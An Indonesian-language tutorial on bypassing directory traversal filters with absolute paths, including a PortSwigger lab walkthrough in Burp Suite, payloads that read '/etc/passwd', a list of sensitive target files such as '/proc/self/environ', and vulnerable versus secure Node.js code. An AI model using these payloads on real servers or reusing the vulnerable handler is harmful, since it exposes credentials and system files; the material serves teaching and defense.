@@ -1,0 +1,231 @@
+# Directory Traversal: Bypassing dengan Absolute Path
+
+**Directory Traversal** (juga dikenal sebagai **File Path Traversal**) adalah kerentanan keamanan web yang memungkinkan penyerang membaca file arbitrer pada sistem operasi server tempat aplikasi dijalankan.
+
+Berkas yang dapat dibaca mencakup kode sumber aplikasi, berkas konfigurasi kredensial database (`.env`), hingga berkas sistem operasi yang sangat sensitif seperti `/etc/passwd` di Linux atau `C:\windows\win.ini` di Windows.
+
+Salah satu teknik _bypass_ yang sering ditemukan adalah memanfaatkan **Absolute Path** ketika sistem proteksi aplikasi hanya memblokir sekuens traversal relatif (`../`).
+
+---
+
+## 1. Konsep Kerentanan: Mengapa Absolute Path Berhasil?
+
+Pada aplikasi web yang menampilkan media dinamis (misalnya gambar produk atau lampiran dokumen), server sering kali mengambil berkas dari direktori penyimpanan menggunakan parameter input:
+
+```http
+GET /image?filename=53.jpg HTTP/1.1
+Host: target-website.com
+```
+
+Untuk mencegah penyerang keluar dari direktori gambar, pengembang sering kali memasang filter keamanan sederhana untuk mendeteksi tanda mundur direktori (_dot-dot-slash_ `../`).
+
+### Celah Filter Blacklist Sederhana
+Jika filter hanya memeriksa keberadaan string `../`, penyerang tidak perlu menggunakan sekuens relatif untuk naik ke direktori root. Penyerang dapat langsung memasukkan **Path Mutlak (Absolute Path)** yang diawali dari root sistem (`/`):
+
+```http
+GET /image?filename=/etc/passwd HTTP/1.1
+```
+
+Karena string `/etc/passwd` tidak mengandung karakter `../`, filter blacklist menganggap request tersebut aman dan meloloskannya ke fungsi pembaca berkas!
+
+---
+
+## 2. Perilaku Path Resolution di Backend (Gotcha Pemrograman)
+
+Selain kelemahan filter, fungsi standar penggabungan path pada beberapa bahasa pemrograman memiliki perilaku khusus ketika menerima absolute path:
+
+### ⚠️ Perilaku di Node.js (`path.resolve`):
+```javascript
+const baseDir = "/var/www/images";
+const userInput = "/etc/passwd";
+
+// path.resolve menganggap input yang diawali "/" sebagai root baru!
+const finalPath = path.resolve(baseDir, userInput);
+console.log(finalPath); // Output: "/etc/passwd" (bukan /var/www/images/etc/passwd)
+```
+
+### ⚠️ Perilaku di Python (`os.path.join`):
+```python
+import os
+base_dir = "/var/www/images"
+user_input = "/etc/passwd"
+
+# os.path.join akan membuang semua path sebelumnya jika menemukan "/" di awal parameter berikutnya!
+final_path = os.path.join(base_dir, user_input)
+print(final_path) # Output: "/etc/passwd"
+```
+
+Akibatnya, fungsi `fs.readFileSync()` atau `open()` langsung membaca berkas dari root sistem operasi!
+
+---
+
+## 3. Alur Eksploitasi: Absolute Path Bypass
+
+![Directory Traversal Absolute Path Bypass](/images/directory-traversal-absolute-path.svg)
+
+---
+
+## 4. Target Berkas Sensitif di Berbagai Sistem Operasi
+
+Ketika menguji celah Directory Traversal, berikut adalah berkas-berkas standar yang sering dijadikan bukti eksploitasi (_Proof of Concept_):
+
+### Sistem Operasi Linux / Unix:
+| Lokasi File | Deskripsi & Nilai Informasi |
+| :--- | :--- |
+| **`/etc/passwd`** | Berisi daftar akun pengguna lokal sistem, direktori home, dan default shell. |
+| **`/etc/hosts`** | Konfigurasi pemetaan nama domain ke IP lokal/internal. |
+| **`/etc/issue`** atau **`/etc/os-release`** | Informasi distro dan versi kernel Linux. |
+| **`/proc/self/environ`** | Environment variable proses aplikasi (sering memuat API key, DB password). |
+| **`/var/log/apache2/access.log`** | Riwayat log akses web server. |
+
+### Sistem Operasi Windows:
+| Lokasi File | Deskripsi & Nilai Informasi |
+| :--- | :--- |
+| **`C:\windows\win.ini`** | Berkas konfigurasi sistem dasar Windows (indikator sukses traversal di Windows). |
+| **`C:\windows\system32\drivers\etc\hosts`** | Berkas konfigurasi hosts lokal Windows. |
+| **`C:\boot.ini`** | Konfigurasi boot loader pada sistem Windows versi lama. |
+
+---
+
+## 5. Praktik Langkah Demi Langkah Menggunakan Burp Suite
+
+Berikut adalah panduan praktis menyelesaikan skenario lab PortSwigger (*File path traversal, traversal sequences blocked with absolute path bypass*):
+
+---
+
+### Langkah 1: Temukan Titik Pemuatan Berkas
+1. Buka browser bawaan **Burp Suite** dan akses halaman toko online pada lab.
+2. Periksa gambar produk yang dimuat. Klik kanan pada gambar dan pilih **Inspect Element**, atau lihat pada tab **Proxy** > **HTTP history**.
+3. Perhatikan request pemanggilan gambar:
+   ```http
+   GET /image?filename=48.jpg HTTP/1.1
+   Host: target-lab.net
+   ```
+
+---
+
+### Langkah 2: Kirim Request ke Burp Repeater
+1. Klik kanan pada request `GET /image?filename=48.jpg`.
+2. Pilih **Send to Repeater** (`Ctrl + R` / `Cmd + R`).
+3. Buka tab **Repeater**.
+
+---
+
+### Langkah 3: Uji Traversal Relatif Standar (Observasi Blokir)
+1. Coba ubah parameter menjadi traversal standar:
+   ```http
+   GET /image?filename=../../../etc/passwd HTTP/1.1
+   ```
+2. Klik tombol **Send**.
+3. Server merespons dengan error (misalnya `400 Bad Request` atau `404 Not Found: "No such file"`), menandakan bahwa sekuens `../` diblokir atau dihapus oleh sistem.
+
+---
+
+### Langkah 4: Terapkan Payload Absolute Path
+1. Ubah nilai parameter `filename` menjadi absolute path langsung ke `/etc/passwd`:
+
+```http
+GET /image?filename=/etc/passwd HTTP/1.1
+Host: target-lab.net
+Cookie: session=xyz...
+```
+
+2. Klik tombol **Send**.
+
+---
+
+### Langkah 5: Analisis Hasil Response
+1. Periksa panel **Response** di sebelah kanan.
+2. Server akan merespons dengan status **`200 OK`** dan menampilkan isi berkas `/etc/passwd`:
+
+```http
+HTTP/1.1 200 OK
+Content-Type: image/jpeg
+Content-Length: 1345
+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+carlos:x:1001:1001:Carlos:/home/carlos:/bin/bash
+peter:x:1002:1002:Peter:/home/peter:/bin/bash
+```
+
+3. Berkas sistem Linux berhasil dibaca dan lab selesai (*Solved*)! 🎉
+
+---
+
+## 6. Bedah Kode Backend: Rentan vs Aman
+
+### ❌ Contoh Kode Backend yang Rentan (Hanya Memblokir `../`)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const baseDir = "/var/www/public/images";
+  const filename = req.query.filename as string;
+
+  // ❌ FILTER BURUK: Hanya memeriksa string "../"
+  if (filename.includes("../")) {
+    return res.status(400).send("Akses direktori dilarang!");
+  }
+
+  // ❌ path.resolve mereset baseDir jika filename diawali "/"
+  const targetPath = path.resolve(baseDir, filename);
+
+  if (fs.existsSync(targetPath)) {
+    return res.sendFile(targetPath); // File /etc/passwd ikut terkirim!
+  }
+
+  return res.status(404).send("File tidak ditemukan.");
+});
+```
+
+---
+
+### ✅ Contoh Kode Backend yang Aman (Whitelist Regex & Canonical Path Verification)
+```typescript
+import path from "path";
+import fs from "fs";
+
+app.get("/image", (req, res) => {
+  const BASE_DIR = path.resolve("/var/www/public/images");
+  const filename = req.query.filename as string;
+
+  // 1. Validasi Whitelist: Hanya izinkan karakter alfanumerik dan ekstensi yang sah
+  const isFilenameSafe = /^[a-zA-Z0-9_-]+\.(jpg|jpeg|png|gif|webp)$/.test(filename);
+  if (!isFilenameSafe) {
+    return res.status(400).json({ error: "Nama berkas tidak valid." });
+  }
+
+  // 2. Canonicalization: Gabungkan path dan pastikan tetap berada di dalam BASE_DIR
+  const targetPath = path.resolve(BASE_DIR, filename);
+
+  // Pastikan hasil path diawali dengan BASE_DIR + separator direktori
+  if (!targetPath.startsWith(BASE_DIR + path.sep)) {
+    return res.status(403).json({ error: "Akses di luar direktori kerja ditolak." });
+  }
+
+  // 3. Periksa keberadaan berkas
+  if (!fs.existsSync(targetPath)) {
+    return res.status(404).json({ error: "Berkas tidak ditemukan." });
+  }
+
+  return res.sendFile(targetPath);
+});
+```
+
+---
+
+## 7. Strategi Mitigasi & Best Practices
+
+1. **Hindari Menggunakan Input Pengguna Langsung sebagai Nama Berkas:**
+   Gunakan ID acak (seperti UUID v4) yang disimpan di database yang memetakan ke berkas fisik di server storage (misalnya `image_id: "550e8400-e29b-41d4-a716-446655440000"`).
+2. **Terapkan Regex Whitelisting yang Ketat:**
+   Tolak semua input yang mengandung karakter khusus seperti `/`, `\`, null bytes `%00`, atau titik ganda `..`.
+3. **Verifikasi Canonical Path (`startsWith(BASE_DIR)`):**
+   Selalu lakukan normalisasi path menggunakan fungsi canonical (`path.resolve` / `realpath`) dan pastikan jalur berkas hasil penggabungan berada di dalam folder yang diizinkan.
+4. **Terapkan Prinsip Hak Akses Minimal (Least Privilege):**
+   Jalankan proses web server menggunakan akun pengguna dengan hak terbatas (misalnya `www-data`) yang tidak memiliki izin membaca berkas sensitif sistem seperti `/etc/shadow` atau direktori `/root`.
